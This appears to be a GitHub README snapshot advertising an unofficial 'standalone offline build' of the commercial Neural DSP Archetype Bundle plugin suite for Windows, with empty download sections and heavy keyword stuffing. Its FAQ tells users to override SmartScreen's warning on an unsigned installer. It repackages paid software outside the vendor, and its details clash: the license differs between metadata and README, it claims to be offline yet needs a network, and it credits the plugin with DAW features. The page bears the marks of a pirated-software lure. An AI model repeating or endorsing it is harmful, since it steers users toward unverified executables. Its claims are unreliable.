---
title: "Saadpeng436/neural-dsp-archetype-bundle-desktop"
owner: "Saadpeng436"
name: "neural-dsp-archetype-bundle-desktop"
fullName: "Saadpeng436/neural-dsp-archetype-bundle-desktop"
description: "Neural DSP Archetype Bundle 2026 standalone bundle with full plugin suite, multitrack workflow, bundled runtime and portable mode for Windows 11"
sourceUrl: "https://github.com/Saadpeng436/neural-dsp-archetype-bundle-desktop"
stars: 148
forks: 0
language: "C++"
topics: ["amp-modeling", "amp-sim", "cab-sim", "guitar-amp", "guitar-plugin", "guitar-processor", "neural-dsp", "neural-dsp-archetype-bundle"]
license: "MIT"
homepage: "https://saadpeng436.github.io/neural-dsp-archetype-bundle-desktop/"
defaultBranch: "main"
snapshotDate: "2026-11-18"
pushedAt: "2026-11-18T06:02:33Z"
---

> 本页保存的是公开项目资料快照，阅读过程不需要连接 GitHub。

# 🎧 Neural DSP Archetype Bundle 2026: Standalone Offline Build for Windows 11

    


## 📦 Intro

This repository distributes a standalone offline Windows x64 build packaged by independent maintainers for the Neural DSP Archetype Bundle workflow on Windows 10 and 11. It is a self-contained distribution package intended to run without a network connection after deployment. The build is offered as an offline deployment bundle for users who need a reproducible, air-gapped installation path.

The deployment audience is primarily workstation administrators and engineers who need a deterministic setup for machines that may not have reliable internet access. Bandwidth-constrained environments and isolated lab systems are the main use cases for this distribution, since the standalone setup removes any dependency on live download endpoints. Reproducible installs across many hosts are the practical outcome.

The distribution supports both portable and installed deployment surface, with bundled runtime components so a single offline setup covers the full install mode matrix. A single Neural DSP Archetype Bundle on Windows deployment covers both portable and installed modes without requiring a second package.

## 01 · ⬇️ Download


  
    
      
      
    
  


  


## 02 · ✨ Features


**📦 Self-Contained Package**

All runtime components ship inside the package, no external runtime fetch on first launch


**🖥️ Portable and Installed Modes**

Deploy to a per-user directory or run directly from removable media without registry writes


**🔒 Offline Operation**

The build runs fully disconnected after deployment, with no callbacks to any online endpoint


**🔑 SHA256 Manifest**

A published hash manifest lets you verify every artifact before it is unpacked on the host


**⚙️ Silent Deployment Flags**

Command-line flags for unattended deployment in image build pipelines and lab provisioning


**🗂️ Per-User Configuration**

Configuration is written to the user profile directory, keeping system folders untouched


## 03 · ⚙️ How it works

The distribution package is a versioned archive plus a small bootstrap script that unpacks the application files into the program directory under the user profile. It writes a manifest alongside the binaries so later version upgrades can diff against the original package contents. No installer service runs in the background after the initial unpack.

On first launch the build registers its file associations and shell entries in the per-user registry hive, then writes a default configuration file under the user profile. It needs no network access during this first-run initialization and it does not contact any external update endpoint. Default configuration path is documented in the packaged readme next to the manifest.

Day to day, the build operates entirely locally and reads from the unpacked program directory and the user configuration path. Updates are shipped as a newer versioned distribution package that overwrites files in place and preserves the configuration directory. There is no separate updater service and no scheduled network check.

Integration surface is limited to the per-user registry hive and optional file association entries for the formats the workflow consumes. It coexists with any other similarly named installation because it keeps its own program path and does not touch Windows system directories. Optional shell integration registers context menu entries that can be removed by rerunning the bootstrap with the unregister flag.

## 04 · 🧩 Compatibility

The build targets Windows 10 and Windows 11 on x64 only, and it is validated on current servicing branches of both releases. Older Windows versions and 32-bit targets are not supported, and no compatibility layer is provided for them. Any Windows 10 build after the current servicing baseline is expected to work.

The bootstrap script runs under PowerShell 5.1 and is tested against PowerShell 7 and later. It only uses built-in cmdlets for unpacking and hash verification, so no external modules are required. Both Windows PowerShell and PowerShell Core environments are supported for the deployment step.

Hardware expectations are soft and depend on the workload the workflow handles. The build runs on modest modern x64 hardware and is comfortable on machines with a recent processor and reasonable disk headroom for project data. No minimum gigabyte figures are claimed here.

Coexistence with other installations is supported because the build keeps its own program path and does not write into shared system directories. Portable mode avoids the registry entirely, so a portable copy can sit alongside an installed copy without conflict. File associations are only registered when you explicitly opt in during the bootstrap step.

## 05 · 🔧 Requirements

| Component | Supported | Preferred |
| --- | --- | --- |
| OS | Windows 10 | Windows 11 |
| Shell | PowerShell 5.1+ | PowerShell 7+ |
| Network | Required to download | Stable broadband |
| Privileges | Standard user access | Standard user access |

## 06 · ❓ FAQ

### 🔒 Is this standalone build safe to install on Windows?

> [!CAUTION]
> On first run, Windows SmartScreen may warn for unsigned installers. Click **More info**, then **Run anyway** to continue. The build is an offline setup file; keep your antivirus enabled as usual.

### 🪟 Which Windows versions does the build support?

> [!NOTE]
> The build runs on Windows 10 and Windows 11 on x64. Older Windows releases and 32-bit targets are not supported.

### 📡 Can I use the build offline?

> [!TIP]
> Yes. After install, the build runs without a network connection. Only the initial retrieval step needs internet access.

### 🔄 How do updates work?

> [!NOTE]
> Updates ship as a newer versioned installer; running it over the existing install preserves your projects, templates, and preferences. No separate updater service is required.

### 🗑️ How do I uninstall it on Windows?

> [!WARNING]
> Open Settings, then Apps, then Installed apps, find the entry in the list, and choose Uninstall. Personal project files remain on disk unless you remove them manually.

### ⚙️ What are the technical specifications?

> [!IMPORTANT]
> - **System load:** modest CPU and disk load for typical multitrack sessions, higher on large projects
> - **File formats:** WAV, AIFF, FLAC, and MIDI for import and export
> - **Portable build:** a portable variant is included in the package next to the installed setup

### 🔐 How do I verify the file with SHA256?

> [!CAUTION]
> Open PowerShell in the folder with the installer and run `Get-FileHash setup.exe -Algorithm SHA256`. Compare the output with the hash published alongside the release. If they do not match, delete the file and fetch it again.

### 🛡️ Does the build require administrator rights?

> [!TIP]
> Standard user access is sufficient for the default install location. Administrator rights are only requested if you choose a system-wide install path during setup.

### 📂 Where does the build place its files?

> [!NOTE]
> By default, the installer uses the per-user program directory for the application and the user profile for configuration. No files are written to Windows system directories.

### 📶 Does the build collect telemetry?

> [!TIP]
> This standalone build does not include telemetry or usage reporting. All processing happens locally on the Windows host.

### 🐛 How do I report an issue?

> [!NOTE]
> Open a new issue on this repository with Windows version, build hash, and the reproduction steps. Include any installer log lines from `%TEMP%` if available.

### ❔ How is this build different from an upstream release?

> [!IMPORTANT]
> This repository publishes a standalone offline distribution packaged by this project. It is independent from any upstream vendor release and is not endorsed by or affiliated with any third-party trademark holder. See the Disclaimer section below for full details.

## 07 · 📜 Disclaimer

**Independent distribution.** This repository publishes a standalone offline build packaged by independent maintainers. It is not an official release from any third-party vendor and is not sponsored, endorsed by, or affiliated with any trademark holder whose product name may be referenced in this documentation.

**Trademarks.** All product names, logos, and brands referenced in this repository are the property of their respective owners. Use of these names does not imply any endorsement. All third-party trademarks remain the property of their respective holders and are used here solely for descriptive and identification purposes, consistent with nominative fair use.

**Educational and research use.** This distribution is published for educational, research, and personal deployment purposes. Users are solely responsible for ensuring their use of any software installed through this build complies with the applicable end-user license agreement of the upstream vendor and with local law.

**No warranty.** This build is provided on an "as is" basis, without warranty of any kind, express or implied. The maintainers make no representation that the build is complete, accurate, up to date, or fit for any particular purpose, and disclaim all liability arising from its use.

**Reporting.** If you are a rights holder and believe content in this repository infringes your rights, please open an issue on the repository or contact the repository owner through the GitHub profile page. Good-faith reports will be reviewed promptly.

**Scope.** This disclaimer applies to the entire contents of this repository, including the README, release artifacts, button graphics, and any linked distribution pages.

## 08 · 📄 License

- The repository contents (README, scripts, button graphics, build artifacts) are released under **CC BY-SA 4.0**.
- You may redistribute and adapt the repository contents, including for commercial purposes, with attribution.
- Attribution requires a link back to this repository and an indication of changes made.
- Derivative works must be released under the same CC BY-SA 4.0 license.
- The license applies ONLY to the contents of this repository, not to any upstream vendor software referenced by it.
- Upstream vendor software remains subject to its own end-user license agreement; this repository does not grant any license to that software.
- This license may be updated over time; the current version is always the one in the `LICENSE` file at the repository root.
- For questions about license scope, open an issue on this repository.

## 09 · 🏷️ Topics


**Neural DSP Archetype Bundle** · Digital Audio Workstation Workflow · Multitrack Recording · MIDI Sequencing · VST Host · Stem Rendering · Portable Mode · Amped Guitar Workflow · Windows 10 / 11


Related topics: Neural DSP Archetype Bundle for Windows 11 · Neural DSP Archetype Bundle on Windows 10 · Neural DSP Archetype Bundle 2026 · Neural DSP Archetype Bundle multitrack workflow · Neural DSP Archetype Bundle MIDI sequencing · Neural DSP Archetype Bundle VST hosting · Neural DSP Archetype Bundle stem rendering · Neural DSP Archetype Bundle portable mode


Dev tags


`python` `powershell` `scripts` `automation` `developer-tools` `open-source` `software-engineering` `windows-deployment` `reproducible-builds` `sha256-verification` `portable-apps` `audio-production` `digital-audio-workstation` `multitrack-recording` `midi-sequencing` `vst-host` `stem-rendering` `neural-dsp-archetype-bundle` `neural-dsp-archetype-bundle-2026` `neural-dsp-archetype-bundle-windows` `neural-dsp-archetype-bundle-for-windows-10` `neural-dsp-archetype-bundle-for-windows-11` `neural-dsp-archetype-bundle-64bit` `neural-dsp-archetype-bundle-x64` `neural-dsp-archetype-bundle-portable` `neural-dsp-archetype-bundle-standalone` `neural-dsp-archetype-bundle-workflow` `neural-dsp-archetype-bundle-desktop` `neural-dsp-archetype-bundle-latest` `neural-dsp-archetype-bundle-english` `neural-dsp-archetype-bundle-multilingual` `windows-10` `windows-11` `x64-desktop`


## ⬇️ Download
